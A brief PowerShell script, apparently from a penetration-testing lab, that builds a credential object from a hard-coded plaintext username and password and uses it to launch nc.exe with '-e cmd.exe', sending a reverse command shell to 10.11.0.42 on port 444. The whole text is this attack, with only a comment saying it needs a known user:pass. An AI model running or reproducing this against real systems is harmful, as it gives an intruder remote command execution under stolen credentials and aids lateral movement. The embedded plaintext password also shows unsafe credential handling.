# NOTE
# This script required knowledge of a user:pass

$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("alice",$secpasswd)
$computer = "bethany"
[System.Diagnostics.Process]::Start("C:\HFS\brian\nc.exe","10.11.0.42 444 -e cmd.exe",$mycreds.Username, $mycreds.Password, $computer)
